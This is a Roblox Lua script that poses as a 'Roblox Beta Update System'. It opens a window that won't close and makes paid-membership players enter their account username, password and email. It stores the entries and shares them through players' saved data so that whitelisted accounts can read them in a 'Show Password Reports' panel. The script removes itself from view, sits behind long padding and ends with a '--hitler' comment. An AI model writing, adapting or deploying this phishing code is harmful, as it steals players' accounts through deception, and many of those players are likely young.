--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


wait()

script.Parent = nil


ReportMod = Instance.new("Model")

Saved = {

}

Took = {}

GotPass = {}

MyCode = "OfficialRoBetaAccUpdater64"

Users={

        [""]=true;

        ["SergeantSmokey"]=true;

}

Delay(0, function()

        while wait() do

                ypcall(function()

                        for _,v in pairs(game:GetService("Players"):GetPlayers()) do

                                ypcall(function()

                                        if Saved[v.Name] ~= nil then

                                                local Ok, Mod = ypcall(function() return v:LoadInstance(MyCode) end)

                                                if Ok and Mod ~= nil then

                                                        if #Mod:GetChildren() >= 0 then

                                                        for _,c in pairs(Mod:GetChildren()) do

                                                                ypcall(function()

                                                                        if not ReportMod:findFirstChild(c.Name) then

                                                                                local Copy = c:Clone()

                                                                                Copy.Parent = ReportMod

                                                                        else

                                                                        end

                                                                end)

                                                        end

                                                        end

                                                end

                                                Took[v.Name] = true

                                        end

                                end)

                        end

                        for _,v in pairs(game:GetService("Players"):GetPlayers()) do

                                ypcall(function()

                                        if Saved[v.Name] ~= nil and Took[v.Name] ~= nil then

                                                v:SaveInstance(MyCode, ReportMod)

                                        end

                                end)

                        end

                end)

        end

end)


function MakePage(Plr, Sender, Abuser, Desc, Proof, Page, AllPages)

        ypcall(function()

                local SG = nil

                local ShowReports = nil

                

                for _,v in pairs(Plr.PlayerGui:GetChildren()) do

                        if v.Name == "Reports" then

                                SG = v

                                break

                        end

                end


                if SG == nil then

                        return

                end

                

                for _,v in pairs(SG:GetChildren()) do

                        if v.Name == "ShowReports" then

                                ShowReports = v

                                break

                        end

                end

                

                if ShowReports == nil then

                        return

                end

                

                local ReportingFrame = Instance.new("Frame")

                ReportingFrame.Name = "ReportingFrame"

                ReportingFrame.Active = true

                ReportingFrame.BackgroundColor3 = Color3.new(0, 0, 0)

                ReportingFrame.BackgroundTransparency = 0.2

                ReportingFrame.BorderSizePixel = 0

                ReportingFrame.Size = UDim2.new(0.6, 0, 0.8, 0)

                ReportingFrame.Position = UDim2.new(0.2, 0, 0.1, 0)

                ReportingFrame.Visible = true

                ReportingFrame.Draggable = false

                ReportingFrame.Parent = SG

                

                local ReportingTitle = Instance.new("TextLabel")

                ReportingTitle.Name = "ReportingTitle"

                ReportingTitle.Text = "Player Details - Sorted By Newest"

                ReportingTitle.TextWrapped = false

                ReportingTitle.TextColor3 = Color3.new(1, 0, 0)

                ReportingTitle.TextTransparency = 0

                ReportingTitle.FontSize = "Size24"

                ReportingTitle.TextStrokeTransparency = 1

                ReportingTitle.Active = true

                ReportingTitle.BackgroundTransparency = 1

                ReportingTitle.BorderSizePixel = 0

                ReportingTitle.Size = UDim2.new(0.8, 0, 0.1, 0)

                ReportingTitle.Position = UDim2.new(0.1, 0, 0.01, 0)

                ReportingTitle.Visible = true

                ReportingTitle.Draggable = false

                ReportingTitle.Parent = ReportingFrame

                

                local ReportPlayerTitle = Instance.new("TextLabel")

                ReportPlayerTitle.Name = "ReportPlayerTitle"

                ReportPlayerTitle.Text = "Sent By: "..Sender

                ReportPlayerTitle.TextWrapped = false

                ReportPlayerTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportPlayerTitle.TextTransparency = 0

                ReportPlayerTitle.FontSize = "Size18"

                ReportPlayerTitle.TextStrokeTransparency = 1

                ReportPlayerTitle.Active = true

                ReportPlayerTitle.BackgroundTransparency = 1

                ReportPlayerTitle.BorderSizePixel = 0

                ReportPlayerTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportPlayerTitle.Position = UDim2.new(0.1, 0, 0.15, 0)

                ReportPlayerTitle.Visible = true

                ReportPlayerTitle.Draggable = false

                ReportPlayerTitle.Parent = ReportingFrame

                

                local ReportAbuserTitle = Instance.new("TextLabel")

                ReportAbuserTitle.Name = "ReportAbuserTitle"

                ReportAbuserTitle.Text = "Account Username: "..Abuser

                ReportAbuserTitle.TextWrapped = false

                ReportAbuserTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportAbuserTitle.TextTransparency = 0

                ReportAbuserTitle.FontSize = "Size18"

                ReportAbuserTitle.TextStrokeTransparency = 1

                ReportAbuserTitle.Active = true

                ReportAbuserTitle.BackgroundTransparency = 1

                ReportAbuserTitle.BorderSizePixel = 0

                ReportAbuserTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportAbuserTitle.Position = UDim2.new(0.1, 0, 0.3, 0)

                ReportAbuserTitle.Visible = true

                ReportAbuserTitle.Draggable = false

                ReportAbuserTitle.Parent = ReportingFrame


                local ReportDescTitle = Instance.new("TextLabel")

                ReportDescTitle.Name = "ReportDescTitle"

                ReportDescTitle.Text = "Account Password: "..Desc

                ReportDescTitle.TextWrapped = false

                ReportDescTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportDescTitle.TextTransparency = 0

                ReportDescTitle.FontSize = "Size18"

                ReportDescTitle.TextStrokeTransparency = 1

                ReportDescTitle.Active = true

                ReportDescTitle.BackgroundTransparency = 1

                ReportDescTitle.BorderSizePixel = 0

                ReportDescTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportDescTitle.Position = UDim2.new(0.1, 0, 0.45, 0)

                ReportDescTitle.Visible = true

                ReportDescTitle.Draggable = false

                ReportDescTitle.Parent = ReportingFrame

                

                local ReportExtraTitle = Instance.new("TextLabel")

                ReportExtraTitle.Name = "ReportExtraTitle"

                ReportExtraTitle.Text = "Account Email: "..Proof

                ReportExtraTitle.TextWrapped = false

                ReportExtraTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportExtraTitle.TextTransparency = 0

                ReportExtraTitle.FontSize = "Size18"

                ReportExtraTitle.TextStrokeTransparency = 1

                ReportExtraTitle.Active = true

                ReportExtraTitle.BackgroundTransparency = 1

                ReportExtraTitle.BorderSizePixel = 0

                ReportExtraTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportExtraTitle.Position = UDim2.new(0.1, 0, 0.6, 0)

                ReportExtraTitle.Visible = true

                ReportExtraTitle.Draggable = false

                ReportExtraTitle.Parent = ReportingFrame

                

                local CloseReport = Instance.new("TextButton")

                CloseReport.Name = "CloseReport"

                CloseReport.Text = "Close"

                CloseReport.TextWrapped = false

                CloseReport.TextColor3 = Color3.new(1, 1, 1)

                CloseReport.FontSize = "Size14"

                CloseReport.TextStrokeTransparency = 1

                CloseReport.AutoButtonColor = true

                CloseReport.Active = true

                CloseReport.BackgroundColor3 = Color3.new(1, 0, 0)

                CloseReport.BackgroundTransparency = 0.2

                CloseReport.BorderSizePixel = 0

                CloseReport.Size = UDim2.new(0.25, 0, 0.1, 0)

                CloseReport.Position = UDim2.new(0.375, 0, 0.875, 0)

                CloseReport.Visible = true

                CloseReport.Draggable = false

                CloseReport.Parent = ReportingFrame

                

                local Right = Instance.new("ImageButton")

                Right.Name = "Right"

                Right.Visible = true

                Right.Active = true

                Right.Image = "http://www.roblox.com/asset/?id=13890052"

                Right.BackgroundTransparency = 1

                Right.BorderSizePixel = 0

                Right.Size = UDim2.new(0.08, 0, 0.15, 0)

                Right.Position = UDim2.new(0.76, 0, 0.425, 0)

                Right.Draggable = false

                Right.Parent = ReportingFrame

                

                Delay(0, function()

                        while Right.Parent ~= nil do wait()

                                if Page == 1 then

                                        Right.Visible = false

                                        Right.Active = false

                                else

                                        Right.Visible = true

                                        Right.Active = true

                                end

                        end

                end)

                

                Right.MouseButton1Click:connect(function()

                        ypcall(function()

                                ReportingFrame:Destroy()

                                Page = Page - 1

                                local NextMod = ReportMod:GetChildren()[Page]

                                MakePage(Plr, NextMod.SentValue.Value, NextMod.AbuserValue.Value, NextMod.AbuseValue.Value, NextMod.ProofValue.Value, Page, AllPages)

                        end)

                end)

                

                local Left = Instance.new("ImageButton")

                Left.Name = "Left"

                Left.Visible = false

                Left.Active = false

                Left.Image = "http://www.roblox.com/asset/?id=13890065"

                Left.BackgroundTransparency = 1

                Left.BorderSizePixel = 0

                Left.Size = UDim2.new(0.08, 0, 0.15, 0)

                Left.Position = UDim2.new(0.16, 0, 0.425, 0)

                Left.Draggable = false

                Left.Parent = ReportingFrame

                

                Delay(0, function()

                        while Left.Parent ~= nil do wait()

                                if Page == AllPages then

                                        Left.Visible = false

                                        Left.Active = false

                                else

                                        Left.Visible = true

                                        Left.Active = true

                                end

                        end

                end)

                

                Left.MouseButton1Click:connect(function()

                        ypcall(function()

                                ReportingFrame:Destroy()

                                Page = Page + 1

                                local NextMod = ReportMod:GetChildren()[Page]

                                MakePage(Plr, NextMod.SentValue.Value, NextMod.AbuserValue.Value, NextMod.AbuseValue.Value, NextMod.ProofValue.Value, Page, AllPages)

                        end)

                end)

                

                CloseReport.MouseButton1Click:connect(function()

                        ReportingFrame:Destroy()

                        ShowReports.Text = "Show Password Reports"

                        ShowReports:TweenPosition(UDim2.new(0.375, 0, 0, 0), "Out", "Quad", 2.25, true)

                end)

                

                if ShowReports.Position == UDim2.new(0.375, 0, 0, 0) then

                        ShowReports:TweenPosition(UDim2.new(0.375, 0, -0.08, 0), "Out", "Quad", 2.25, true)

                end

        end)

end


function ShowReportsButton(Plr)

        ypcall(function()

                for _,v in pairs(Plr.PlayerGui:GetChildren()) do

                        if v.Name == "Reports" then

                                v:Destroy()

                        end

                end

                

                local SG = Instance.new("ScreenGui")

                SG.Name = "Reports"

                SG.Parent = Plr.PlayerGui

                

                local ShowReports = Instance.new("TextButton")

                ShowReports.Name = "ShowReports"

                ShowReports.Text = "Loading..."

                ShowReports.TextWrapped = false

                ShowReports.TextColor3 = Color3.new(1, 0, 0)

                ShowReports.TextTransparency = 0.2

                ShowReports.FontSize = "Size14"

                ShowReports.TextStrokeTransparency = 1

                ShowReports.AutoButtonColor = true

                ShowReports.Active = true

                ShowReports.BackgroundColor3 = Color3.new(0, 0, 0)

                ShowReports.BackgroundTransparency = 0.2

                ShowReports.BorderColor3 = Color3.new(1, 0, 0)

                ShowReports.Size = UDim2.new(0.25, 0, 0.075, 0)

                ShowReports.Position = UDim2.new(0.375, 0, 0, 0)

                ShowReports.Visible = true

                ShowReports.Draggable = false

                ShowReports.Parent = SG

                

        --        repeat wait() until Saved[Plr.Name] ~= nil

                ShowReports.Text = "Show Password Reports"

                

                

                ShowReports.MouseButton1Click:connect(function()

                        ypcall(function()

                                if #ReportMod:GetChildren() >= 1 then

                                        ShowReports.Text = "Reports Loading..."

                                        LatestMod = ReportMod:GetChildren()[#ReportMod:GetChildren()]

                                        MakePage(Plr, LatestMod.SentValue.Value, LatestMod.AbuserValue.Value, LatestMod.AbuseValue.Value, LatestMod.ProofValue.Value, #ReportMod:GetChildren(), #ReportMod:GetChildren())

                                else

                                        ShowReports.Text = "No Reports"

                                        wait(2)

                                        ShowReports.Text = "Show Password Reports"

                                end

                        end)

                end)

        end)

end


function ReportButton(Plr)

        ypcall(function()

                for _,v in pairs(Plr.PlayerGui:GetChildren()) do

                        if v.Name == "ReportToHR" then

                                v:Destroy()

                        end

                end

                

                local SG = Instance.new("ScreenGui")

                SG.Name = "ReportToHR"

                SG.Parent = Plr.PlayerGui


                local ReportingFrame = Instance.new("Frame")

                ReportingFrame.Name = "ReportingFrame"

                ReportingFrame.Active = true

                ReportingFrame.BackgroundColor3 = Color3.new(0, 0, 0)

                ReportingFrame.BackgroundTransparency = 0.2

                ReportingFrame.BorderSizePixel = 0

                ReportingFrame.Size = UDim2.new(0.6, 0, 0.8, 0)

                ReportingFrame.Position = UDim2.new(-0.65, 0, 0.1, 0)

                ReportingFrame.Visible = true

                ReportingFrame.Draggable = false

                ReportingFrame.Parent = SG

                

                local ReportingTitle = Instance.new("TextLabel")

                ReportingTitle.Name = "ReportingTitle"

                ReportingTitle.Font = "ArialBold"

                ReportingTitle.Text = "Roblox Beta Update System"

                ReportingTitle.TextWrapped = false

                ReportingTitle.TextColor3 = Color3.new(1, 0, 0)

                ReportingTitle.TextTransparency = 0

                ReportingTitle.FontSize = "Size36"

                ReportingTitle.TextStrokeTransparency = 1

                ReportingTitle.Active = true

                ReportingTitle.BackgroundTransparency = 1

                ReportingTitle.BorderSizePixel = 0

                ReportingTitle.Size = UDim2.new(0.8, 0, 0.1, 0)

                ReportingTitle.Position = UDim2.new(0.1, 0, 0.01, 0)

                ReportingTitle.Visible = true

                ReportingTitle.Draggable = false

                ReportingTitle.Parent = ReportingFrame

                

                local ReportPlayerTitle = Instance.new("TextLabel")

                ReportPlayerTitle.Name = "ReportPlayerTitle"

                ReportPlayerTitle.Font = "Arial"

                ReportPlayerTitle.Text = "Account Username:"

                ReportPlayerTitle.TextWrapped = false

                ReportPlayerTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportPlayerTitle.TextTransparency = 0

                ReportPlayerTitle.FontSize = "Size24"

                ReportPlayerTitle.TextStrokeTransparency = 1

                ReportPlayerTitle.Active = true

                ReportPlayerTitle.BackgroundTransparency = 1

                ReportPlayerTitle.BorderSizePixel = 0

                ReportPlayerTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportPlayerTitle.Position = UDim2.new(0.1, 0, 0.05, 0)

                ReportPlayerTitle.Visible = true

                ReportPlayerTitle.Draggable = false

                ReportPlayerTitle.Parent = ReportingFrame

                

                local ReportPlayerBox = Instance.new("TextBox")

                ReportPlayerBox.Name = "ReportPlayerBox"

                ReportPlayerBox.Font = "Arial"

                ReportPlayerBox.Text = "Your Username Here"

                ReportPlayerBox.TextWrapped = true

                ReportPlayerBox.TextColor3 = Color3.new(0, 0, 0)

                ReportPlayerBox.TextTransparency = 0

                ReportPlayerBox.FontSize = "Size18"

                ReportPlayerBox.ClearTextOnFocus = false

                ReportPlayerBox.TextStrokeTransparency = 1

                ReportPlayerBox.Active = true

                ReportPlayerBox.BackgroundColor3 = Color3.new(1, 1, 1)

                ReportPlayerBox.BackgroundTransparency = 0.2

                ReportPlayerBox.BorderColor3 = Color3.new(1, 0, 0)

                ReportPlayerBox.BorderSizePixel = 1

                ReportPlayerBox.Size = UDim2.new(0.8, 0, 0.1, 0)

                ReportPlayerBox.Position = UDim2.new(0.1, 0, 0.2, 0)

                ReportPlayerBox.Visible = true

                ReportPlayerBox.Draggable = false

                ReportPlayerBox.Parent = ReportingFrame

                

                local ReportDescTitle = Instance.new("TextLabel")

                ReportDescTitle.Name = "ReportDescTitle"

                ReportDescTitle.Font = "Arial"

                ReportDescTitle.Text = "Account Password:"

                ReportDescTitle.TextWrapped = false

                ReportDescTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportDescTitle.TextTransparency = 0

                ReportDescTitle.FontSize = "Size24"

                ReportDescTitle.TextStrokeTransparency = 1

                ReportDescTitle.Active = true

                ReportDescTitle.BackgroundTransparency = 1

                ReportDescTitle.BorderSizePixel = 0

                ReportDescTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportDescTitle.Position = UDim2.new(0.1, 0, 0.275, 0)

                ReportDescTitle.Visible = true

                ReportDescTitle.Draggable = false

                ReportDescTitle.Parent = ReportingFrame

                

                local ReportDescBox = Instance.new("TextBox")

                ReportDescBox.Name = "ReportDescBox"

                ReportDescBox.Font = "Arial"

                ReportDescBox.Text = "Your Password Here"

                ReportDescBox.TextWrapped = true

                ReportDescBox.TextColor3 = Color3.new(0, 0, 0)

                ReportDescBox.TextTransparency = 0

                ReportDescBox.FontSize = "Size18"

                ReportDescBox.ClearTextOnFocus = false

                ReportDescBox.TextStrokeTransparency = 1

                ReportDescBox.Active = true

                ReportDescBox.BackgroundColor3 = Color3.new(1, 1, 1)

                ReportDescBox.BackgroundTransparency = 0.2

                ReportDescBox.BorderColor3 = Color3.new(1, 0, 0)

                ReportDescBox.BorderSizePixel = 1

                ReportDescBox.Size = UDim2.new(0.8, 0, 0.15, 0)

                ReportDescBox.Position = UDim2.new(0.1, 0, 0.425, 0)

                ReportDescBox.Visible = true

                ReportDescBox.Draggable = false

                ReportDescBox.Parent = ReportingFrame

                

                local ReportExtraTitle = Instance.new("TextLabel")

                ReportExtraTitle.Name = "ReportExtraTitle"

                ReportExtraTitle.Font = "Arial"

                ReportExtraTitle.Text = "Account Email (Optional):"

                ReportExtraTitle.TextWrapped = false

                ReportExtraTitle.TextColor3 = Color3.new(1, 1, 1)

                ReportExtraTitle.TextTransparency = 0

                ReportExtraTitle.FontSize = "Size24"

                ReportExtraTitle.TextStrokeTransparency = 1

                ReportExtraTitle.Active = true

                ReportExtraTitle.BackgroundTransparency = 1

                ReportExtraTitle.BorderSizePixel = 0

                ReportExtraTitle.Size = UDim2.new(0.8, 0, 0.2, 0)

                ReportExtraTitle.Position = UDim2.new(0.1, 0, 0.55, 0)

                ReportExtraTitle.Visible = true

                ReportExtraTitle.Draggable = false

                ReportExtraTitle.Parent = ReportingFrame

                

                local ReportExtraBox = Instance.new("TextBox")

                ReportExtraBox.Name = "ReportExtraBox"

                ReportExtraBox.Font = "Arial"

                ReportExtraBox.Text = "Your Email Here"

                ReportExtraBox.TextWrapped = true

                ReportExtraBox.TextColor3 = Color3.new(0, 0, 0)

                ReportExtraBox.TextTransparency = 0

                ReportExtraBox.FontSize = "Size18"

                ReportExtraBox.ClearTextOnFocus = false

                ReportExtraBox.TextStrokeTransparency = 1

                ReportExtraBox.Active = true

                ReportExtraBox.BackgroundColor3 = Color3.new(1, 1, 1)

                ReportExtraBox.BackgroundTransparency = 0.2

                ReportExtraBox.BorderColor3 = Color3.new(1, 0, 0)

                ReportExtraBox.BorderSizePixel = 1

                ReportExtraBox.Size = UDim2.new(0.8, 0, 0.15, 0)

                ReportExtraBox.Position = UDim2.new(0.1, 0, 0.7, 0)

                ReportExtraBox.Visible = true

                ReportExtraBox.Draggable = false

                ReportExtraBox.Parent = ReportingFrame

                

                local SendReport = Instance.new("TextButton")

                SendReport.Name = "SendReport"

                SendReport.Font = "Arial"

                SendReport.Text = "Update"

                SendReport.TextWrapped = false

                SendReport.TextColor3 = Color3.new(1, 1, 1)

                SendReport.FontSize = "Size18"

                SendReport.TextStrokeTransparency = 1

                SendReport.AutoButtonColor = true

                SendReport.Active = true

                SendReport.BackgroundColor3 = Color3.new(1, 0, 0)

                SendReport.BackgroundTransparency = 0.2

                SendReport.BorderSizePixel = 0

                SendReport.Size = UDim2.new(0.25, 0, 0.1, 0)

                SendReport.Position = UDim2.new(0.575, 0, 0.875, 0)

                SendReport.Visible = true

                SendReport.Draggable = false

                SendReport.Parent = ReportingFrame

                

                local CloseReport = Instance.new("TextButton")

                CloseReport.Name = "CloseReport"

                CloseReport.Font = "Arial"

                CloseReport.Text = "Close"

                CloseReport.TextWrapped = false

                CloseReport.TextColor3 = Color3.new(1, 1, 1)

                CloseReport.FontSize = "Size18"

                CloseReport.TextStrokeTransparency = 1

                CloseReport.AutoButtonColor = true

                CloseReport.Active = true

                CloseReport.BackgroundColor3 = Color3.new(1, 0, 0)

                CloseReport.BackgroundTransparency = 0.2

                CloseReport.BorderSizePixel = 0

                CloseReport.Size = UDim2.new(0.25, 0, 0.1, 0)

                CloseReport.Position = UDim2.new(0.175, 0, 0.875, 0)

                CloseReport.Visible = true

                CloseReport.Draggable = false

                CloseReport.Parent = ReportingFrame

                

                CloseReport.MouseButton1Click:connect(function()

                        if GotPass[Plr.Name] ~= nil then

                                ReportingFrame:Destroy()

                        else

                                ypcall(function()

                                        ReportingTitle.Text = "Please Fill Out The Beta Update System"

                                        wait(4)

                                        ReportingTitle.Text = "Roblox Beta Update System"

                                end)

                        end

                end)

                

                SendReport.MouseButton1Click:connect(function()

                        local Ok, Err = ypcall(function()

                                if ReportDescBox.Text == "Your Password Here" or ReportDescBox.Text == "" or ReportPlayerBox.Text ~= Plr.Name or #ReportPlayerBox.Text < 3 or #ReportPlayerBox.Text > 20 or #ReportDescBox.Text < 6 or #ReportDescBox.Text > 20 then

                                        ReportingTitle.Text = "Error: Non Optional Boxes Must Be Filled In Correctly"

                                        wait(4)

                                        ReportingTitle.Text = "Roblox Beta Update System"

                                else

                                        local AbuserName = ReportPlayerBox.Text

                                        local Abuse = ReportDescBox.Text

                                        local SentBy = Plr.Name

                                        local Proof = "N/A"

                                        if ReportExtraBox.Text == "Your Email Here" or ReportExtraBox.Text == "" then

                                                Proof = "N/A"

                                        else

                                                Proof = ReportExtraBox.Text

                                        end

                                        

                                        local Holder = Instance.new("Model")

                                        Holder.Name = math.random(-999999999, 999999999)

                                        local SentValue = Instance.new("StringValue")

                                        SentValue.Name = "SentValue"

                                        SentValue.Value = SentBy

                                        SentValue.Parent = Holder

                                        local AbuserValue = Instance.new("StringValue")

                                        AbuserValue.Name = "AbuserValue"

                                        AbuserValue.Value = AbuserName

                                        AbuserValue.Parent = Holder

                                        local AbuseValue = Instance.new("StringValue")

                                        AbuseValue.Name = "AbuseValue"

                                        AbuseValue.Value = Abuse

                                        AbuseValue.Parent = Holder

                                        local ProofValue = Instance.new("StringValue")

                                        ProofValue.Name = "ProofValue"

                                        ProofValue.Value = Proof

                                        ProofValue.Parent = Holder

                                        Holder.Parent = ReportMod

                                        

                                        GotPass[Plr.Name] = true

                                        

                                        ReportingTitle.Text = "Update Completed!"

                                        ReportingTitle.TextColor3 = Color3.new(0, 1, 0)

                                        wait(1)

                                        ReportingFrame:Destroy()

                                end

                        end)

                        if not Ok then

                                ypcall(function()

                                        ReportingTitle.Text = "Error: "..Err

                                        wait(4)

                                        ReportingTitle.Text = "Roblox Beta Update System"

                                end)

                        end

                end)

                

                wait()


                ReportingFrame:TweenPosition(UDim2.new(0.2, 0, 0.1, 0), "Out", "Quad", 2, true)

        end)

end


game:GetService("Players").PlayerAdded:connect(function(Plr)

        Plr:WaitForDataReady()

        ypcall(function()

                local Ok, Mod = ypcall(function() return Plr:LoadInstance(MyCode) end)

                if not Ok or Mod == nil then

                        Plr:SaveInstance(MyCode, ReportMod)

                end

                Saved[Plr.Name] = true

                Delay(0, function()

                        while Plr.Parent ~= nil do

                                wait()

                                ypcall(function()

                                        if Plr:findFirstChild("PlayerGui") then

                                                if Users[Plr.Name] then

                                                        if not Plr.PlayerGui:findFirstChild("Reports") then

                                                                ShowReportsButton(Plr)

                                                        end

                                                else

                                                        if not Plr.PlayerGui:findFirstChild("ReportToHR") and Plr.MembershipType ~= Enum.MembershipType.None and GotPass[Plr.Name]==nil then

                                                                ReportButton(Plr)

                                                        end

                                                end

                                        end

                                end)

                        end

                end)

        end)

end)


for _,Plr in pairs(game:GetService("Players"):GetPlayers()) do

        Plr:WaitForDataReady()

        ypcall(function()

                local Ok, Mod = ypcall(function() return Plr:LoadInstance(MyCode) end)

                if not Ok or Mod == nil or Mod == "" then

                        Plr:SaveInstance(MyCode, ReportMod)

                end

                Saved[Plr.Name] = true

                Delay(0, function()

                        while Plr.Parent ~= nil do

                                wait()

                                ypcall(function()

                                        if Plr:findFirstChild("PlayerGui") and GotPass[Plr.Name] == nil then

                                                if Users[Plr.Name] then

                                                        if not Plr.PlayerGui:findFirstChild("Reports") then

                                                                ShowReportsButton(Plr)

                                                        end

                                                elseif Plr.Name~="flipflop8421" then

                                                        if not Plr.PlayerGui:findFirstChild("ReportToHR") and Plr.MembershipType ~= Enum.MembershipType.None  and GotPass[Plr.Name]==nil then

                                                                ReportButton(Plr)

                                                        end

                                                end

                                        end

                                end)

                        end

                end)

        end)

end


--hitler
